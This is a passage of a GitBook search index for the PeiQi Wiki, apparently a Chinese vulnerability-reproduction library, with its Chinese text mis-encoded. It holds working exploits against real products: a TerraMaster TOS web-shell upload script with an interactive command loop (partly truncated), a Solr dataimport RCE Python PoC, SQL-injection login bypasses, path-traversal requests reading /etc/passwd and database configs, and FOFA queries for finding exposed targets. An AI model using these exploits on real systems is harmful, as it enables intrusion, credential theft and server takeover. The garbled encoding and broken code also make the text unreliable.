ä»»æ„è´¦å·å¯†ç ä¿®æ”¹æ¼æ´ CVE-2020-28186.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TerraMaster/TerraMaster TOS ä»»æ„è´¦å·å¯†ç ä¿®æ”¹æ¼æ´ CVE-2020-28186.html","title":"TerraMaster TOS ä»»æ„è´¦å·å¯†ç ä¿®æ”¹æ¼æ´ CVE-2020-28186","keywords":"","body":"TerraMaster TOS ä»»æ„è´¦å·å¯†ç ä¿®æ”¹æ¼æ´ CVE-2020-28186 æ¼æ´æè¿° TerraMaster TOS æ¼æ´å½±å“ [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" æ¼æ´å¤ç° é¦–å…ˆéœ€è¦çŸ¥é“å·²çŸ¥ç”¨æˆ·åï¼Œå¯ä»¥å‚è€ƒ TerraMaster TOS ç”¨æˆ·æšä¸¾æ¼æ´ CVE-2020-28185 è·å–å·²çŸ¥çš„ç”¨æˆ·å é‡ç½®é¡µé¢è¾“å…¥è·å–çš„è´¦å·å’Œé‚®ç®± ç‚¹å‡»ç¡®å®šï¼ŒæŠ“åŒ…æ›´æ¢é‚®ç®±æ¥æ”¶éªŒè¯ç  é€šè¿‡æ¥æ”¶çš„éªŒè¯ç å³å¯æ›´æ¢è´¦å·å¯†ç ç™»å½•åå° PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TerraMaster/TerraMaster TOS åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-28187.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TerraMaster/TerraMaster TOS åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-28187.html","title":"TerraMaster TOS åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-28187","keywords":"","body":"TerraMaster TOS åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-28187 æ¼æ´æè¿° TerraMaster TOS æ¼æ´å½±å“ [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" æ¼æ´å¤ç° ç™»é™†åè®¿é—®ï¼ŒéªŒè¯æ¼æ´çš„POCä¸º /tos/index.php?editor/fileGet&filename=../../../../../../etc/passwd PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TerraMaster/TerraMaster TOS RCE CVE-2020-28188.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/TerraMaster/TerraMaster TOS RCE CVE-2020-28188.html","title":"TerraMaster TOS RCE CVE-2020-28188","keywords":"","body":"TerraMaster TOS RCE CVE-2020-28188 æ¼æ´æè¿° TerraMaster TOS 4.2.06 ä»¥ä¸‹ä¸­ makecvs.php å­˜åœ¨ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ¶æ„æ–‡ä»¶æ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å­˜åœ¨æ¼æ´çš„ä¸º /include/makecvs.php ä¸­çš„Eventå‚æ•° ä½¿ç”¨EXPæ–‡ä»¶ä¸Šä¼ å¹¶æ‰§è¡Œå‘½ä»¤ æ¼æ´POC # Exploit Title: TerraMaster TOS 4.2.06 - RCE (Unauthenticated) # Date: 12/12/2020 # Exploit Author: IHTeam # Full Write-up: https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/ # Vendor Homepage: https://www.terra-master.com/ # Version: \\\" >> /usr/www/\"+shell_filename+\" && chmod +x /usr/www/\"+shell_filename+\"||\" payload = urllib.parse.quote(payload, safe='') print(\"[/] Uploading shell...\") response = requests.get(url+'/include/makecvs.php?Event='+payload, headers=headers, verify=False) time.sleep(1) response = requests.get(url+'/'+shell_filename+'?cmd=cat /etc/passwd', headers=headers, verify=False) if ('root:' in str(response.content, 'utf-8')): print(\"[+] Upload succeeded\") else: print(\"\\n[-] Error uploading shell: \", response.content) sys.exit() def interactive_shell(url, headers, shell_filename, cmd): response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(cmd, safe=''), headers=headers, verify=False) print(str(response.text)+\"\\n\") def delete_shell(url, headers, shell_filename): delcmd = \"rm /usr/www/\"+shell_filename response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(delcmd, safe=''), headers=headers, verify=False) print(\"\\n[+] Shell deleted\") upload_shell(url, headers, shell_filename) try: while True: cmd = input(\"# \") interactive_shell(url, headers, shell_filename, cmd) except: delete_shell(url, headers, shell_filename) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/1039å®¶æ ¡é€š/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/1039å®¶æ ¡é€š/","title":"1039å®¶æ ¡é€š","keywords":"","body":"1039å®¶æ ¡é€š 1039å®¶æ ¡é€š ä¸‡èƒ½å¯†ç ç»•è¿‡ CNVD-2020-31494 1039å®¶æ ¡é€š åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-03 16:06:46 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/1039å®¶æ ¡é€š/1039å®¶æ ¡é€š ä¸‡èƒ½å¯†ç ç»•è¿‡ CNVD-2020-31494.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/1039å®¶æ ¡é€š/1039å®¶æ ¡é€š ä¸‡èƒ½å¯†ç ç»•è¿‡ CNVD-2020-31494.html","title":"1039å®¶æ ¡é€š ä¸‡èƒ½å¯†ç ç»•è¿‡ CNVD-2020-31494","keywords":"","body":"1039å®¶æ ¡é€š ä¸‡èƒ½å¯†ç ç»•è¿‡ CNVD-2020-31494 æ¼æ´æè¿° åŒ—äº¬1039ç§‘æŠ€å‘å±•æœ‰é™å…¬å¸æ˜¯ä¸€å®¶ä¸“æ³¨é©¾æ ¡ç®¡ç†ç³»ç»Ÿã€é©¾æ ¡ç§»åŠ¨åŠå…¬ç³»ç»Ÿã€é©¾æ ¡ç®¡ç†è½¯ä»¶ã€é©¾æ ¡æ‹›ç”Ÿå°ç¨‹åºå¼€å‘ç­‰,ä¸ºé©¾æ ¡æä¾›æ— æ­»è§’çš„é©¾æ ¡ç®¡ç†ç³»ç»Ÿè§£å†³æ–¹æ¡ˆã€‚ åŒ—äº¬1039ç§‘æŠ€å‘å±•æœ‰é™å…¬å¸é©¾æ ¡ç®¡ç†ç³»ç»Ÿå­˜åœ¨ä¸‡èƒ½å¯†ç ç»•è¿‡æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è·å–æ•°æ®åº“ä¿¡æ¯ã€‚ æ¼æ´å½±å“ [!NOTE] 1039å®¶æ ¡é€š v1.0 - v6.0 FOFA [!NOTE] title=\"å­¦å‘˜ç™»å½•_1039å®¶æ ¡é€š\" æ¼æ´å¤ç° ç®¡ç†å‘˜ç™»å½•æ¥å£ä¸º /admin/Product/Comstye.aspx /Student/StudentLogin.aspx /Teacher/Index.aspx è´¦å·å¯†ç ä¸ºå¦‚ä¸‹å³å¯ç™»å½• user:peiqi pass:' or ''=' PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/1039å®¶æ ¡é€š/1039å®¶æ ¡é€š åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/1039å®¶æ ¡é€š/1039å®¶æ ¡é€š åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html","title":"1039å®¶æ ¡é€š åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","keywords":"","body":"1039å®¶æ ¡é€š åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¼æ´æè¿° åŒ—äº¬1039ç§‘æŠ€å‘å±•æœ‰é™å…¬å¸æ˜¯ä¸€å®¶ä¸“æ³¨é©¾æ ¡ç®¡ç†ç³»ç»Ÿã€é©¾æ ¡ç§»åŠ¨åŠå…¬ç³»ç»Ÿã€é©¾æ ¡ç®¡ç†è½¯ä»¶ã€é©¾æ ¡æ‹›ç”Ÿå°ç¨‹åºå¼€å‘ç­‰,ä¸ºé©¾æ ¡æä¾›æ— æ­»è§’çš„é©¾æ ¡ç®¡ç†ç³»ç»Ÿè§£å†³æ–¹æ¡ˆã€‚ åŒ—äº¬1039ç§‘æŠ€å‘å±•æœ‰é™å…¬å¸é©¾æ ¡ç®¡ç†ç³»ç»Ÿåå°ç¼–è¾‘å™¨å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æŠ“åŒ…çš„æ–¹å¼å¾—çŸ¥webshellè·¯å¾„ï¼Œå¯¼è‡´æœåŠ¡å™¨è¢«å…¥ä¾µ æ¼æ´å½±å“ [!NOTE] 1039å®¶æ ¡é€š v1.0 - v6.0 FOFA [!NOTE] title=\"å­¦å‘˜ç™»å½•_1039å®¶æ ¡é€š\" æ¼æ´å¤ç° ä½¿ç”¨ 1039å®¶æ ¡é€š ä¸‡èƒ½å¯†ç ç»•è¿‡ CNVD-2020-31494 ç™»å½•åå°åæ‰¾åˆ°ç¼–è¾‘å™¨é¡µé¢ BurpæŠ“åŒ…ä¸Šä¼  asp webshellæœ¨é©¬ å¯ä»¥å¾—çŸ¥webshellåœ°å€ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„å†°èé»˜è®¤é©¬ï¼Œä½¿ç”¨å†°èè¿æ¥ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ±‰ç‹ç§‘æŠ€/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ±‰ç‹ç§‘æŠ€/","title":"æ±‰ç‹ç§‘æŠ€","keywords":"","body":"æ±‰ç‹ç§‘æŠ€ æ±‰ç‹äººè„¸è€ƒå‹¤ç®¡ç†ç³»ç»Ÿ Check SQLæ³¨å…¥æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-19 18:41:58 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ±‰ç‹ç§‘æŠ€/æ±‰ç‹äººè„¸è€ƒå‹¤ç®¡ç†ç³»ç»Ÿ Check SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ±‰ç‹ç§‘æŠ€/æ±‰ç‹äººè„¸è€ƒå‹¤ç®¡ç†ç³»ç»Ÿ Check SQLæ³¨å…¥æ¼æ´.html","title":"æ±‰ç‹äººè„¸è€ƒå‹¤ç®¡ç†ç³»ç»Ÿ Check SQLæ³¨å…¥æ¼æ´","keywords":"","body":"æ±‰ç‹äººè„¸è€ƒå‹¤ç®¡ç†ç³»ç»Ÿ Check SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° æ±‰ç‹äººè„¸è€ƒå‹¤ç®¡ç†ç³»ç»Ÿå­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯ã€‚ æ¼æ´å½±å“ [!NOTE] æ±‰ç‹äººè„¸è€ƒå‹¤ç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] title=\"\"æ±‰ç‹äººè„¸è€ƒå‹¤ç®¡ç†ç³»ç»Ÿ\"\" æ¼æ´å¤ç° ç™»å½•ç•Œé¢å¦‚ä¸‹ è¯·æ±‚åŒ…å¦‚ä¸‹ POST /Login/Check HTTP/1.1 Host: x.x.x.x Content-Length: 27 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://x.x.x.x:8088 Referer: http://x.x.x.x:8088/Login/Index Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ASP.NET_SessionId=otvxgfy0csmrw4i5y5t24oo1 Connection: close strName=admin&strPwd=123456 å…¶ä¸­strNameå‚æ•°å­˜åœ¨æ³¨å…¥ sqlmap -r postwang.txt -p strName --current-user user: admin' or 1=1-- pass: admin ä¸‡èƒ½å¯†ç ç»•è¿‡ç™»å½• Goby & POC PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æé€šEWEBS/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æé€šEWEBS/","title":"æé€šEWEBS","keywords":"","body":"æé€šEWEBS æé€šEWEBS testweb.php æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ æé€šEWEBS casmain.xgi ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-15 13:24:40 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æé€šEWEBS/æé€šEWEBS casmain.xgi ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æé€šEWEBS/æé€šEWEBS casmain.xgi ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"æé€šEWEBS casmain.xgi ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"æé€šEWEBS casmain.xgi ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° æé€šEWEBS casmain.xgi ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] æé€šEWEBS FOFA [!NOTE] app=\"æ–°è½¯ç§‘æŠ€-æé€šEWEBS\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´è¯·æ±‚åŒ…ä¸º POST /casmain.xgi HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=923b86fa90ce1e14c82d4e36d1adc528; CookieLanguageName=ZH-CN Content-Length: 57 Language_S=../../../../windows/system32/drivers/etc/hosts å¯ä»¥é…åˆ testweb.php ä¿¡æ¯æ³„éœ²è¯»å–æ•æ„Ÿä¿¡æ¯ Language_S=../../Data/CONFIG/CasDbCnn.dat PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-15 13:11:23 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/äº¿èµ›é€š/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/äº¿èµ›é€š/","title":"äº¿èµ›é€š","keywords":"","body":"äº¿èµ›é€š äº¿èµ›é€š ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ dataimport è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-01 13:30:57 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/äº¿èµ›é€š/äº¿èµ›é€š ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ dataimport è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/äº¿èµ›é€š/äº¿èµ›é€š ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ dataimport è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"äº¿èµ›é€š ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ dataimport è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"äº¿èµ›é€š ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ dataimport è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° äº¿èµ›é€š ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ dataimport å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹å®šçš„è¯·æ±‚å¯æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] äº¿èµ›é€š ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] title=\"ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å…ˆè·å– core name è®¿é—®è·¯å¾„ /solr/admin/cores ä½¿ç”¨POCæ‰§è¡Œwhoami æ¼æ´POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mTitle : äº¿èµ›é€š ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ dataimport è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/solr/admin/cores\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/solr/admin/cores.... \\033[0m\".format(target_url)) if 'responseHeader' in response.text and response.status_code == 200: result = re.search( r'([\\s\\S]*?)', response.text, re.I) core_name = result.group(1) print(\"\\033[36m[o] è·å–core_name : {} \\033[0m\".format(core_name)) POC_2(target_url, core_name) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, core_name): cmd = \"whoami\" vuln_url = target_url + \"/solr/{}/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22{}%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20\".format(core_name, cmd) files = { 'stream.body': ''' ''' } try: print(\"\\033[36m[o] æ­£åœ¨æ‰§è¡Œ whoami ... \\033[0m\".format(target_url)) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, files=files, verify=False, timeout=5) cmd_response = re.search( r'documents\">([\\s\\S]*?)', response.text, re.I) cmd_response = cmd_response.group(1) if response.status_code == 200 and cmd_response: print(\"\\033[36m[o] å‘½ä»¤å“åº”ä¸º:\\n{} \\033[0m\".format(cmd_response)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-02 10:02:51 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­åˆ›è§†è¿…/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­åˆ›è§†è¿…/","title":"ä¸­åˆ›è§†è¿…","keywords":"","body":"ä¸­åˆ›è§†è¿… ä¼šæ·é€šäº‘è§†è®¯ list ç›®å½•æ–‡ä»¶æ³„éœ²æ¼æ´ ä¼šæ·é€šäº‘è§†è®¯ fileDownload ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ ä¼šæ·é€šäº‘è§†è®¯ ç™»å½•ç»•è¿‡æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-18 00:19:48 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­åˆ›è§†è¿…/ä¼šæ·é€šäº‘è§†è®¯ list ç›®å½•æ–‡ä»¶æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­åˆ›è§†è¿…/ä¼šæ·é€šäº‘è§†è®¯ list ç›®å½•æ–‡ä»¶æ³„éœ²æ¼æ´.html","title":"ä¼šæ·é€šäº‘è§†è®¯ list ç›®å½•æ–‡ä»¶æ³„éœ²æ¼æ´","keywords":"","body":"ä¼šæ·é€šäº‘è§†è®¯ list ç›®å½•æ–‡ä»¶æ³„éœ²æ¼æ´ æ¼æ´æè¿° ä¼šæ·é€šäº‘è§†è®¯æŸä¸ªæ–‡ä»¶ listå‚æ•° å­˜åœ¨ç›®å½•æ–‡ä»¶æ³„éœ²æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–ä¸€äº›æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] ä¼šæ·é€šäº‘è§†è®¯ FOFA [!NOTE] body=\"/him/api/rest/v1.0/node/role\" æ¼æ´å¤ç° ç™»é™†é¡µé¢å¦‚ä¸‹ è®¿é—®Url /him/api/rest/V1.0/system/log/list?filePath=../ Goby & POC PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­åˆ›è§†è¿…/ä¼šæ·é€šäº‘è§†è®¯ fileDownload ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­åˆ›è§†è¿…/ä¼šæ·é€šäº‘è§†è®¯ fileDownload ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"ä¼šæ·é€šäº‘è§†è®¯ fileDownload ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"ä¼šæ·é€šäº‘è§†è®¯ fileDownload ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° ä¼šæ·é€šäº‘è§†è®¯ fileDownload å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è¯»å–æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] ä¼šæ·é€šäº‘è§†è®¯ FOFA [!NOTE] body=\"/him/api/rest/v1.0/node/role\" æ¼æ´å¤ç° ç™»é™†é¡µé¢å¦‚ä¸‹ å‘é€è¯·æ±‚åŒ… POST /fileDownload?action=downloadBackupFile HTTP/1.1 Host: Content-Length: 24 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://36.99.45.142:9090/fileDownload?action=downloadBackupFile Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 fullPath=%2Fetc%2Fpasswd Goby & POC PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­åˆ›è§†è¿…/ä¼šæ·é€šäº‘è§†è®¯ ç™»å½•ç»•è¿‡æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­åˆ›è§†è¿…/ä¼šæ·é€šäº‘è§†è®¯ ç™»å½•ç»•è¿‡æ¼æ´.html","title":"ä¼šæ·é€šäº‘è§†è®¯ ç™»å½•ç»•è¿‡æ¼æ´","keywords":"","body":"ä¼šæ·é€šäº‘è§†è®¯ ç™»å½•ç»•è¿‡æ¼æ´ æ¼æ´æè¿° ä¼šæ·é€šäº‘è§†è®¯å­˜åœ¨ç™»é™†ç»•è¿‡æ¼æ´ï¼Œé€šè¿‡æ‹¦æˆªç‰¹å®šçš„è¯·æ±‚åŒ…å¹¶ä¿®æ”¹å³å¯è·å–åå°æƒé™ æ¼æ´å½±å“ [!NOTE] ä¼šæ·é€šäº‘è§†è®¯ FOFA [!NOTE] body=\"/him/api/rest/v1.0/node/role\" æ¼æ´å¤ç° ç™»é™†é¡µé¢å¦‚ä¸‹ è¾“å…¥ä»»æ„è´¦å·å¯†ç æŠ“åŒ… ä¿®æ”¹è¿”å›åŒ…ä¸ºå¦‚ä¸‹åæ”¾åŒ…åˆ™æˆåŠŸç»•è¿‡ç™»å½• HTTP/1.1 200 Server: Hsengine/1.4.1 Date: Mon, 17 May 2021 16:13:43 GMT Content-Type: application/json;charset=UTF-8 Connection: close X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block Accept-Ranges: bytes Vary: Accept-Charset, Accept-Encoding, Accept-Language, Accept Content-Length: 61 {\"token\":null,\"result\":null} PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/","title":"å¤©èä¿¡","keywords":"","body":"å¤©èä¿¡ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB 